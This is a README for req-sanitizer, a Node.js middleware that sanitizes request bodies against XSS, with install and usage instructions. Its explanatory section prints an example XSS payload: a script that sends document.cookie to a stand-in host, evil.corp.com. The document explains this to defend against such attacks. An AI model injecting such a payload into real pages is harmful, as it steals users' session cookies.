[![Pull requests](https://img.shields.io/badge/PRs-Welcome-brightgreen.svg)](https://github.com/peerquery/req-sanitizer/pulls)
[![Build status](https://travis-ci.org/peerquery/req-sanitizer.svg?branch=master)](https://travis-ci.org/peerquery/req-sanitizer)
[![Dep tracker](https://david-dm.org/peerquery/req-sanitizer.svg)](https://david-dm.org/peerquery/req-sanitizer)
[![Codebase license](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/peerquery/req-sanitizer/blob/master/LICENSE)

# req-sanitizer

`Node.js` middleware to sanitize the `req.body` object and all its values against XSS.

## What this module does

When configured right, this module sanitizes the `req.body` of HTML XSS on all requests with just one line of code! You can now safely processes, store and render the values without the need to re-sanitize them.

This module is built on the blazingly fast and secure [XSS Filters](https://www.npmjs.com/package/xss-filters) library by [Yahoo](https://yahoo.github.io/secure-handlebars/xssfilters.html)!

## Warning!?

This module does not sanitize against `operator` injection for Mongo DB or any other DB. If you are using Mongo DB, consider including [Express Mongoose Sanitize](https://www.npmjs.com/package/express-mongo-sanitize) for projection against `operator injection`.

## Installation

```
npm install --save req-sanitizer
```

## Usage

```javascript

var reqSanitizer = require('req-sanitizer');
Mount the middleware below the bodyParser() instantiations and above mounting of your routes

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

// Mount first before any other req function or router
app.use(reqSanitizer()); // this line follows bodyParser() instantiations

```

**One liner**

```javascript

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

// Mount first before any other req function or router
app.use(require('req-sanitizer')()); // this line follows bodyParser() instantiations

```

### That is all!

All your `req.body` values are sanitized against XSS! You can stored them directly in the DB and display them directly on HTML without the need to sanitize them again.

All input from your APIs and POST methods are sanitized. However remember you still need to sanitize for the DB. At Peer Query we use [express-mongo-sanitize](https://npm.js.com/package/express-mongo-sanitize).


## Sanitization is hard!

Did you know that you need to sanitize your content twice? One for the DB and one for HTML. Did you also know that validating does not make your data secure? Validating data type would see this script get through:

`'<script>location.href='http://evil.corp.com?cookie='+document.cookie;</script>'`

That is a valid string. Lets say that is what someone entered into the name input field on your site's contact form. And you assumed that only the message `body` could contain XSS so you sanitized only that field!

When you rendered this user's info on your site, the above script would run! At the same time, let say you tried to individually sanitize all fields with a custom `sanitize()` module:

```javascript
var messageData = {
    name : sanitize(req.body.name),
    email : sanitize(req.body.email),
    message : sanitize(req.body.message),
    time : sanitize(req.body.time)
};

messageController.addMessage(req,res,messageData);
```

This would be too much bloat, without even mentioning that you would have to repeat this configuration for every single controller and API! What happens when you miss one of those fields? You are a toast. Save yourself hassle and automate this entire hassle with this module.

## Sanitization is required multiples times

Mongoose and MYSQL have their own sanitizing schemes, however implementing that does not make your content secure. For a secure system you need to sanitize all input into your DB.

Sanitizing is a must for all secure web apps. Unfortunately, for Node.js there has been very scanty **accurate** information on the topic. A lots of Node.js sanitization libraries are either outdated or no longer maintained. In the mean while, most sanitization efforts focus on sanitizing only a single object, such data from a certain endpoint, DB or API.

Read this detailed post to get the full concept as well as the severity of the issue: [5 Steps to Handling Untrusted Node.js Data](https://lockmedown.com/5-steps-handling-untrusted-node-js-data/)

## Contribution is welcome.

I was inspired to build it after finding out that there was virtually no plug-and-play middleware for `Node.js` to sanitize the `req.body`. 
